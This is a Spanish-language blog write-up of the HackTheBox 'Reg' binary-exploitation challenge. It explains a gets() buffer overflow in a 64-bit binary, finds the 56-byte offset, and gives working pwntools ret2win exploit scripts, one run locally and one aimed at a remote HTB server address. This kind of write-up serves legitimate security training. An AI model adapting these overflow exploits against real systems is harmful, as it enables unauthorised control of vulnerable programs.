---
title: Reg - Pwn Challenge (HTB) ❤
author: sha-16
categories: [linux, binary exploitation, htb]
tags: [linux, pwn, htb, 64-bit] 
---

Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. 

Este es un reto de pwning, del tipo `ret2win`, el cual implica explotar un *Buffer Overflow* con el objetivo hacer una llamado a una función que imprime la `flag` del desafío por pantalla.

Para comenzar, primeramente realizamos un análisis general del binario, checando sus protecciones:

![Untitled](/assets/img/htb/pwn/Reg/Untitled.png)

Como se muestra en imagen, el binario es de `64 bits` y posee la protección `no-execute (NX)`, lo cual desde ya, significa que no podremos cargar código malicioso en el stack, mediante un `shellcode`.

Hecho esto, podemos empezar a entender la función y comportamiento del programa:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%201.png)

Al parecer es algo bastante sencillo, ya que sólo te pide el nombre y nada más.

En base a esto, comenzamos jugar y en lugar de colocar un nombre de `10 bytes`, metemos una `string` de `100 bytes`:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%202.png)

Como se muestra en imagen, el programa arroja un error `segmentation fault`, lo cual es más que suficiente para intuir que hemos desbordado el *buffer*.

Sabiendo esto, analizaremos el programa un poco más a fondo, aplicando reversing con Ghidra.

En la siguiente imagen, podemos observar que existe una función `main` la cual hace una llamada a `run`:

```c
int main(void)

{
  run();
  return 0;
}
```

La función `run` está encargada de recibir los datos del usuario por medio de la función `gets`, como se muestra a continuación:

```c
void run(void)

{
  char user_name [48];
  
  initialize();
  printf("Enter your name : ");
  gets(user_name);
  puts("Registered!");
  return;
}
```

En este punto, ya podemos identificar dónde se acontece el *buffer overflow*. 

Como se muestra en el código anterior, el programa usa la función `gets` para recibir el `input` del usuario. Dicha función es conocidamente vulnerable a ataques de desbordamiento de *buffer*, ya que esta no valida si el número de `bytes` introducidos por el usuario coinciden con aquellos que se reservaron para la variable, en base a esto el usuario puede comenzar a sobrescribir otras área de la memoria y controlar el flujo del programa:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%203.png)

Siguiendo con Ghidra, se logra identificar una función `winner` la cual no es llamada desde `main` o `run`:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%204.png)

Como se observa a continuación, el código de la función `winner` se encarga de imprimir el contenido del archivo `flag.txt` por pantalla:

```c
void winner(void)

{
  char flag_content [1032];
  FILE *flag_file;
  
  puts("Congratulations!");
  flag_file = fopen("flag.txt","r");
  fgets(flag_content,1024,flag_file);
  puts(flag_content);
  fclose(flag_file);
  return;
}
```

Una vez analizado todo el flujo del programa, continuamos con la detección del `offset`, o sea la cantidad de bytes que tenemos que meter en el *overflow* antes de sobrescribir la dirección de retorno.

Para esto computamos una cadena `100 bytes`, utilizando `pattern create` en `gdb-gef`:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%205.png)

Al colocar esta cadena en el `name` provocamos que se sobrescriban los registros del programa, con lo que logramos detectar el `offset` correctamente:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%206.png)

Teniendo el `offset` en mano, sólo nos estaría faltando identificar la ubicación de memoria de la función `winner`, lo cual es logrado fácilmente con la herramienta `readelf`:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%207.png)

En base a todos los datos recopilados anteriormente, se construye el siguiente exploit, el cual se encarga de explotar el BoF de manera local para leer el contenido del archivo `flag.txt`:

```python
#!/usr/bin/env python3

from pwn import process, p64

if __name__ == '__main__':
    p = process('./reg')

    offset = 56
    junk = b'\x41' * offset
    
    winner_addr = 0x401206 # winner() location

    # ret2win payload
    payload = junk 
    payload += p64(winner_addr) 

    p.sendlineafter(b'Enter your name : ', payload)
    p.interactive()
```

Como se puede observar en imagen, el BoF es explotado correctamente de forma local:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%208.png)

Para explotar el BoF de forma remota, sólo tendríamos que modificar el exploit, colocando el método `remote` en lugar de `process`, y así conectarnos al server de HTB:

```python
#!/usr/bin/env python3

from pwn import remote, p64, log

if __name__ == '__main__':
    p = remote('206.189.27.45', 31721) # htb remote connection

    offset = 56
    junk = b'\x41' * offset

    # winner() function location
    winner_addr = 0x401206

    # ret2win payload
    payload = junk 
    payload += p64(winner_addr) 

    # exploiting bof
    p.sendlineafter(b'Enter your name : ', payload)
    p.interactive()
```

Ya ejecutando el exploit logramos obtener la `flag` del desafío correctamente:

![Untitled](/assets/img/htb/pwn/Reg/Untitled%209.png)